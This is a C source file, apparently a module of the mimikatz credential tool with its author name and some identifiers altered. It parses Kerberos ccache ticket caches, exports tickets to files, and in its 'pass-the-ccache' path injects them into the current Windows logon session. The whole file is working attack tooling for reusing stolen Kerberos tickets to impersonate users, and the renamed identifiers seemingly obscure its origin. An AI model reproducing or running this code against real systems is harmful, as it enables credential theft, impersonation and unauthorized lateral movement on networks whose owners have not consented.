/*	paparas DELPY `gamidiaaktinidio`
	http://blog.gamidiaaktinidio.com
	paparas@gamidiaaktinidio.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_kerberos_ccache.h"

DECLARE_CONST_UNICODE_STRING(usXCACHECONF, L"X-CACHECONF:");
NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, BOOL isSave)
{
	PBYTE file, dedomena;
	DWORD length, i;
	USHORT version;

	PKERB_EXTERNAL_NAME principalName; UNICODE_STRING principalRealm;
	Paktinidio_KERBEROS_TICKET ticket;
	PBERVAL BerApp_KrbCred;
	wchar_t * saveFilename;

	if(argc)
	{
		if(kull_m_file_readData(argv[0], &file, &length))
		{
			dedomena = file;	
			version = _byteswap_ushort(*(PUSHORT) dedomena); dedomena += sizeof(USHORT);
			if((version == 0x0504) || (version == 0x0503))
			{
				if(version == 0x0504)
					dedomena += sizeof(USHORT) + _byteswap_ushort(*(PUSHORT) dedomena);
				kuhl_m_kerberos_ccache_externalname(&dedomena, &principalName, &principalRealm);
				if(principalName)
				{
					kuhl_m_kerberos_ticket_displayExternalName(L"\nPrincipal : ", principalName, &principalRealm);
					for(i = 0; dedomena < (file + length); i++)
					{
						kprintf(L"\n\nData %u", i);
						if(ticket = (Paktinidio_KERBEROS_TICKET) LocalAlloc(LPTR, sizeof(aktinidio_KERBEROS_TICKET)))
						{
							kuhl_m_kerberos_ccache_externalname(&dedomena, &ticket->ClientName, &ticket->AltTargetDomainName);
							kuhl_m_kerberos_ccache_externalname(&dedomena, &ticket->ServiceName, &ticket->DomainName);
							
							ticket->TargetName = kuhl_m_kerberos_ticket_copyExternalName(ticket->ServiceName);
							kull_m_string_copyUnicodeStringBuffer(&ticket->DomainName, &ticket->TargetDomainName);
							
							ticket->KeyType = _byteswap_ushort(*(PUSHORT) dedomena); dedomena += sizeof(USHORT);
							ticket->TicketEncType = _byteswap_ushort(*(PUSHORT) dedomena); dedomena += sizeof(USHORT);
							if(version == 0x0504)
							{
								ticket->Key.Length = _byteswap_ushort(*(PUSHORT) dedomena); dedomena += sizeof(USHORT);
							}
							else
							{
								ticket->Key.Length = _byteswap_ulong(*(PDWORD) dedomena); dedomena += sizeof(DWORD);
							}
							if(ticket->Key.Length)
								if(ticket->Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket->Key.Length))
									RtlCopyMemory(ticket->Key.Value, dedomena, ticket->Key.Length);
							dedomena += ticket->Key.Length + sizeof(DWORD); // authtime;
							
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) dedomena), &ticket->StartTime); dedomena += sizeof(DWORD); // local ?
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) dedomena), &ticket->EndTime); dedomena += sizeof(DWORD);
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) dedomena), &ticket->RenewUntil); dedomena += sizeof(DWORD) + sizeof(UCHAR); // skey

							ticket->TicketFlags = _byteswap_ulong(*(PDWORD) dedomena); dedomena += sizeof(DWORD);
							kuhl_m_kerberos_ccache_skip_struct_with_buffer(&dedomena); // address
							kuhl_m_kerberos_ccache_skip_struct_with_buffer(&dedomena); // authdedomena
							
							ticket->Ticket.Length = _byteswap_ulong(*(PDWORD) dedomena); dedomena += sizeof(DWORD);
							ticket->TicketKvno = 2;
							if(ticket->Ticket.Length)
								if(ticket->Ticket.Value = (PUCHAR) LocalAlloc(LPTR, ticket->Ticket.Length))
									RtlCopyMemory(ticket->Ticket.Value, dedomena, ticket->Ticket.Length);
							dedomena += ticket->Ticket.Length;
							kuhl_m_kerberos_ccache_skip_buffer(&dedomena);

							if(!RtlEqualUnicodeString(&usXCACHECONF, &ticket->TargetDomainName, TRUE))
							{
								kuhl_m_kerberos_ticket_display(ticket, TRUE, FALSE);
								if(isSave || isInject)
								{
									if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(ticket, TRUE))
									{
										if(isInject)
										{
											kprintf(L"\n\t   * Injecting ticket : ");
											if(NT_SUCCESS(kuhl_m_kerberos_ptt_dedomena(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
												kprintf(L"OK\n");
										}
										else
										{
											if(saveFilename = kuhl_m_kerberos_ccache_generateFileName(i, ticket, programa_KERBEROS_EXT))
											{
												if(kull_m_file_writeData(saveFilename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
													kprintf(L"\n\t   * Saved to file %s !", saveFilename);
												else PRINT_ERROR_AUTO(L"kull_m_file_writeData");

												LocalFree(saveFilename);
											}
										}
										ber_bvfree(BerApp_KrbCred);
									}
								}
							}
							else kprintf(L"\n\t* %wZ entry? *", &usXCACHECONF);
							kuhl_m_kerberos_ticket_freeTicket(ticket);
						}
					}
					kuhl_m_kerberos_ticket_freeExternalName(principalName);
				}
			}
			else PRINT_ERROR(L"ccache version != 0x0504 or version != 0x0503\n");
			LocalFree(file);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	else PRINT_ERROR(L"At least one filename is needed\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_ccache_ptc(int argc, wchar_t * argv[])
{
	kuhl_m_kerberos_ccache_enum(argc, argv, TRUE, FALSE);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_ccache_list(int argc, wchar_t * argv[])
{
	kuhl_m_kerberos_ccache_enum(argc, argv, FALSE, kull_m_string_args_byName(argc, argv, L"export", NULL, NULL));
	return STATUS_SUCCESS;
}

void kuhl_m_kerberos_ccache_UnixTimeToFileTime(time_t t, LPFILETIME pft)
{
	*(PLONGLONG) pft = Int32x32To64(t, 10000000) + 116444736000000000;
}

BOOL kuhl_m_kerberos_ccache_unicode_string(PBYTE *dedomena, PUNICODE_STRING ustring)
{
	BOOL status = FALSE;
	STRING sName;
	sName.Length = sName.MaximumLength = (USHORT) _byteswap_ulong(*(PDWORD) *dedomena);	*dedomena += sizeof(DWORD);
	sName.Buffer = (PCHAR) *dedomena; *dedomena += sName.Length;
	ustring->Length = sName.Length * sizeof(wchar_t);
	ustring->MaximumLength = ustring->Length + sizeof(wchar_t);
	if(ustring->Buffer = (PWSTR) LocalAlloc(LPTR, ustring->MaximumLength))
	{
		if(!(status = NT_SUCCESS(RtlAnsiStringToUnicodeString(ustring, &sName, FALSE))))
			LocalFree(ustring->Buffer);
	}
	return status;
}

BOOL kuhl_m_kerberos_ccache_externalname(PBYTE *dedomena, PKERB_EXTERNAL_NAME * name, PUNICODE_STRING realm)
{
	BOOL status = FALSE;
	DWORD i, count = _byteswap_ulong(*(PDWORD) (*dedomena + sizeof(DWORD)));
	*name = NULL;
	if(count)
	{
		if(*name = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) + ((count - 1) * sizeof(UNICODE_STRING))))
		{
			(*name)->NameCount = (USHORT) count;
			(*name)->NameType = (USHORT) _byteswap_ulong(*(PDWORD) *dedomena);
			*dedomena += 2 * sizeof(DWORD);
			
			status = kuhl_m_kerberos_ccache_unicode_string(dedomena, realm);
			for(i = 0; i < count; i++)
				status &= kuhl_m_kerberos_ccache_unicode_string(dedomena, &(*name)->Names[i]);
		}
	}
	return status;
}

void kuhl_m_kerberos_ccache_skip_buffer(PBYTE *dedomena)
{
	*dedomena += sizeof(DWORD) + _byteswap_ulong(*(PDWORD) *dedomena);
}

void kuhl_m_kerberos_ccache_skip_struct_with_buffer(PBYTE *dedomena)
{
	DWORD i, numBuff = _byteswap_ulong(*(PDWORD) *dedomena); *dedomena += sizeof(DWORD);
	for (i = 0; i < numBuff; i++)
	{
		*dedomena += sizeof(USHORT);
		kuhl_m_kerberos_ccache_skip_buffer(dedomena);
	}
}

wchar_t * kuhl_m_kerberos_ccache_generateFileName(const DWORD index, Paktinidio_KERBEROS_TICKET ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	BOOL isLong = kuhl_m_kerberos_ticket_isLongFilename(ticket);

	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(isLong)
			isLong = swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
		else
			isLong = swprintf_s(buffer, charCount, L"%u-%08x.%s", index, ticket->TicketFlags, ext) > 0;
		
		if(isLong)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}